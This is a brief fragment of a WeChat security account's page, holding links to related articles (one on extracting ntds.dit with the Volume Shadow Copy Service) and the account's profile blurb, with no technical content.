](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

利用卷影拷贝服务提取ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 85篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)